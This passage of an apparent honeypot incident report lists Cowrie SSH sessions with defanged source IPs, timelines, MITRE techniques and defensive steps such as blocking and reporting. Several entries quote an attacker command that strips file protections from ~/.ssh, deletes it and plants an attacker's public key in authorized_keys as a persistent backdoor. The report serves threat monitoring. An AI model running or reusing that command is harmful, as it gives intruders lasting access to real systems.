| `2026-06-02 06:02:21` | `cowrie.command.failed` |
| `2026-06-02 06:02:21` | `cowrie.log.closed` |
| `2026-06-02 06:02:22` | `cowrie.session.params` |
| `2026-06-02 06:02:22` | `cowrie.command.input` |
| `2026-06-02 06:02:22` | `cowrie.session.file_download` |
| `2026-06-02 06:02:22` | `cowrie.log.closed` |
| `2026-06-02 06:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35dce578b55b

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 06:02 |
| **Last Seen** | 2026-06-02 06:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 06:02:24` | `cowrie.session.connect` |
| `2026-06-02 06:02:24` | `cowrie.client.version` |
| `2026-06-02 06:02:24` | `cowrie.client.kex` |
| `2026-06-02 06:02:25` | `cowrie.login.success` |
| `2026-06-02 06:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59f51b4df042

| Field | Detail |
|---|---|
| **Source IP** | `59.36.78[.]66` |
| **First Seen** | 2026-06-02 07:00 |
| **Last Seen** | 2026-06-02 07:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:00:25` | `cowrie.session.connect` |
| `2026-06-02 07:00:26` | `cowrie.client.version` |
| `2026-06-02 07:00:26` | `cowrie.client.kex` |
| `2026-06-02 07:00:26` | `cowrie.login.success` |
| `2026-06-02 07:00:26` | `cowrie.session.params` |
| `2026-06-02 07:00:26` | `cowrie.command.input` |
| `2026-06-02 07:00:27` | `cowrie.command.failed` |
| `2026-06-02 07:00:27` | `cowrie.log.closed` |
| `2026-06-02 07:00:27` | `cowrie.session.params` |
| `2026-06-02 07:00:27` | `cowrie.command.input` |
| `2026-06-02 07:00:27` | `cowrie.session.file_download` |
| `2026-06-02 07:00:27` | `cowrie.log.closed` |
| `2026-06-02 07:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.36.78[.]66` to AbuseIPDB if not already reported
- [ ] Block `59.36.78[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98656017d843

| Field | Detail |
|---|---|
| **Source IP** | `59.36.78[.]66` |
| **First Seen** | 2026-06-02 07:00 |
| **Last Seen** | 2026-06-02 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:00:30` | `cowrie.session.connect` |
| `2026-06-02 07:00:30` | `cowrie.client.version` |
| `2026-06-02 07:00:30` | `cowrie.client.kex` |
| `2026-06-02 07:00:31` | `cowrie.login.success` |
| `2026-06-02 07:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.36.78[.]66` to AbuseIPDB if not already reported
- [ ] Block `59.36.78[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-366e5308ae6f

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:01 |
| **Last Seen** | 2026-06-02 07:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:01:20` | `cowrie.session.connect` |
| `2026-06-02 07:01:20` | `cowrie.client.version` |
| `2026-06-02 07:01:20` | `cowrie.client.kex` |
| `2026-06-02 07:01:22` | `cowrie.login.success` |
| `2026-06-02 07:01:23` | `cowrie.session.params` |
| `2026-06-02 07:01:23` | `cowrie.command.input` |
| `2026-06-02 07:01:23` | `cowrie.command.failed` |
| `2026-06-02 07:01:23` | `cowrie.log.closed` |
| `2026-06-02 07:01:24` | `cowrie.session.params` |
| `2026-06-02 07:01:24` | `cowrie.command.input` |
| `2026-06-02 07:01:24` | `cowrie.session.file_download` |
| `2026-06-02 07:01:24` | `cowrie.log.closed` |
| `2026-06-02 07:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15deb59d59c1

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:01 |
| **Last Seen** | 2026-06-02 07:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:01:28` | `cowrie.session.connect` |
| `2026-06-02 07:01:28` | `cowrie.client.version` |
| `2026-06-02 07:01:29` | `cowrie.client.kex` |
| `2026-06-02 07:01:30` | `cowrie.login.success` |
| `2026-06-02 07:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-106e88770016

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:04 |
| **Last Seen** | 2026-06-02 07:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:04:25` | `cowrie.session.connect` |
| `2026-06-02 07:04:25` | `cowrie.client.version` |
| `2026-06-02 07:04:25` | `cowrie.client.kex` |
| `2026-06-02 07:04:27` | `cowrie.login.success` |
| `2026-06-02 07:04:28` | `cowrie.session.params` |
| `2026-06-02 07:04:28` | `cowrie.command.input` |
| `2026-06-02 07:04:28` | `cowrie.command.failed` |
| `2026-06-02 07:04:28` | `cowrie.log.closed` |
| `2026-06-02 07:04:29` | `cowrie.session.params` |
| `2026-06-02 07:04:29` | `cowrie.command.input` |
| `2026-06-02 07:04:29` | `cowrie.session.file_download` |
| `2026-06-02 07:04:29` | `cowrie.log.closed` |
| `2026-06-02 07:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664950af8ed0

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:04 |
| **Last Seen** | 2026-06-02 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:04:33` | `cowrie.session.connect` |
| `2026-06-02 07:04:33` | `cowrie.client.version` |
| `2026-06-02 07:04:34` | `cowrie.client.kex` |
| `2026-06-02 07:04:35` | `cowrie.login.success` |
| `2026-06-02 07:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9486cabe2296

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:08 |
| **Last Seen** | 2026-06-02 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:08:08` | `cowrie.session.connect` |
| `2026-06-02 07:08:08` | `cowrie.client.version` |
| `2026-06-02 07:08:08` | `cowrie.client.kex` |
| `2026-06-02 07:08:08` | `cowrie.login.success` |
| `2026-06-02 07:08:09` | `cowrie.session.params` |
| `2026-06-02 07:08:09` | `cowrie.command.input` |
| `2026-06-02 07:08:09` | `cowrie.command.failed` |
| `2026-06-02 07:08:09` | `cowrie.log.closed` |
| `2026-06-02 07:08:09` | `cowrie.session.params` |
| `2026-06-02 07:08:09` | `cowrie.command.input` |
| `2026-06-02 07:08:09` | `cowrie.session.file_download` |
| `2026-06-02 07:08:09` | `cowrie.log.closed` |
| `2026-06-02 07:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22088cb9a222

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:08 |
| **Last Seen** | 2026-06-02 07:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:08:10` | `cowrie.session.connect` |
| `2026-06-02 07:08:10` | `cowrie.client.version` |
| `2026-06-02 07:08:10` | `cowrie.client.kex` |
| `2026-06-02 07:08:10` | `cowrie.login.success` |
| `2026-06-02 07:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e6c82f84a2

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:09 |
| **Last Seen** | 2026-06-02 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:09:52` | `cowrie.session.connect` |
| `2026-06-02 07:09:52` | `cowrie.client.version` |
| `2026-06-02 07:09:52` | `cowrie.client.kex` |
| `2026-06-02 07:09:52` | `cowrie.login.success` |
| `2026-06-02 07:09:52` | `cowrie.session.params` |
| `2026-06-02 07:09:52` | `cowrie.command.input` |
| `2026-06-02 07:09:52` | `cowrie.command.failed` |
| `2026-06-02 07:09:52` | `cowrie.log.closed` |
| `2026-06-02 07:09:52` | `cowrie.session.params` |
| `2026-06-02 07:09:52` | `cowrie.command.input` |
| `2026-06-02 07:09:52` | `cowrie.session.file_download` |
| `2026-06-02 07:09:52` | `cowrie.log.closed` |
| `2026-06-02 07:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f5d0e022cb

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:09 |
| **Last Seen** | 2026-06-02 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:09:54` | `cowrie.session.connect` |
| `2026-06-02 07:09:54` | `cowrie.client.version` |
| `2026-06-02 07:09:54` | `cowrie.client.kex` |
| `2026-06-02 07:09:54` | `cowrie.login.success` |
| `2026-06-02 07:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-431f3c6b85db

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:10 |
| **Last Seen** | 2026-06-02 07:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:10:28` | `cowrie.session.connect` |
| `2026-06-02 07:10:28` | `cowrie.client.version` |
| `2026-06-02 07:10:28` | `cowrie.client.kex` |
| `2026-06-02 07:10:30` | `cowrie.login.success` |
| `2026-06-02 07:10:31` | `cowrie.session.params` |
| `2026-06-02 07:10:31` | `cowrie.command.input` |
| `2026-06-02 07:10:31` | `cowrie.command.failed` |
| `2026-06-02 07:10:31` | `cowrie.log.closed` |
| `2026-06-02 07:10:32` | `cowrie.session.params` |
| `2026-06-02 07:10:32` | `cowrie.command.input` |
| `2026-06-02 07:10:32` | `cowrie.session.file_download` |
| `2026-06-02 07:10:32` | `cowrie.log.closed` |
| `2026-06-02 07:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab9df0f6687a

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:10 |
| **Last Seen** | 2026-06-02 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:10:36` | `cowrie.session.connect` |
| `2026-06-02 07:10:36` | `cowrie.client.version` |
| `2026-06-02 07:10:37` | `cowrie.client.kex` |
| `2026-06-02 07:10:38` | `cowrie.login.success` |
| `2026-06-02 07:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cce6fc419a4

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:13 |
| **Last Seen** | 2026-06-02 07:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:13:32` | `cowrie.session.connect` |
| `2026-06-02 07:13:32` | `cowrie.client.version` |
| `2026-06-02 07:13:33` | `cowrie.client.kex` |
| `2026-06-02 07:13:34` | `cowrie.login.success` |
| `2026-06-02 07:13:35` | `cowrie.session.params` |
| `2026-06-02 07:13:35` | `cowrie.command.input` |
| `2026-06-02 07:13:35` | `cowrie.command.failed` |
| `2026-06-02 07:13:36` | `cowrie.log.closed` |
| `2026-06-02 07:13:36` | `cowrie.session.params` |
| `2026-06-02 07:13:36` | `cowrie.command.input` |
| `2026-06-02 07:13:37` | `cowrie.session.file_download` |
| `2026-06-02 07:13:37` | `cowrie.log.closed` |
| `2026-06-02 07:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b0ee8f9313

| Field | Detail |
|---|---|
| **Source IP** | `190.244.39[.]224` |
| **First Seen** | 2026-06-02 07:13 |
| **Last Seen** | 2026-06-02 07:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:13:41` | `cowrie.session.connect` |
| `2026-06-02 07:13:41` | `cowrie.client.version` |
| `2026-06-02 07:13:41` | `cowrie.client.kex` |
| `2026-06-02 07:13:43` | `cowrie.login.success` |
| `2026-06-02 07:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.244.39[.]224` to AbuseIPDB if not already reported
- [ ] Block `190.244.39[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abd15c90592a

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:14 |
| **Last Seen** | 2026-06-02 07:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:14:59` | `cowrie.session.connect` |
| `2026-06-02 07:14:59` | `cowrie.client.version` |
| `2026-06-02 07:14:59` | `cowrie.client.kex` |
| `2026-06-02 07:15:00` | `cowrie.login.success` |
| `2026-06-02 07:15:00` | `cowrie.session.params` |
| `2026-06-02 07:15:00` | `cowrie.command.input` |
| `2026-06-02 07:15:00` | `cowrie.command.failed` |
| `2026-06-02 07:15:00` | `cowrie.log.closed` |
| `2026-06-02 07:15:00` | `cowrie.session.params` |
| `2026-06-02 07:15:00` | `cowrie.command.input` |
| `2026-06-02 07:15:00` | `cowrie.session.file_download` |
| `2026-06-02 07:15:00` | `cowrie.log.closed` |
| `2026-06-02 07:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda72b728899

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:15 |
| **Last Seen** | 2026-06-02 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:15:01` | `cowrie.session.connect` |
| `2026-06-02 07:15:01` | `cowrie.client.version` |
| `2026-06-02 07:15:01` | `cowrie.client.kex` |
| `2026-06-02 07:15:01` | `cowrie.login.success` |
| `2026-06-02 07:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0349845c32b

| Field | Detail |
|---|---|
